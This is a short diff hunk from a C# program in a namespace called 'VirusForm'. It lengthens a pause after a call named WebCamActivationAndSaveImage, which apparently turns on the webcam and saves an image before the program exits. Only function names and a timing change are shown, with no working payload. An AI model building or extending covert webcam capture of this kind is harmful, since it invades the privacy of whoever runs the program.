@@ -157,7 +157,7 @@ namespace VirusForm
                 virusFormWork.Start();
                 Thread.Sleep(2000);
                 WebCamActivationAndSaveImage();
-                Thread.Sleep(30000);
+                Thread.Sleep(180000);
                 Application.Exit();
                
                  //   System.Diagnostics.Stopwatch sw = new System.Diagnostics.Stopwatch();
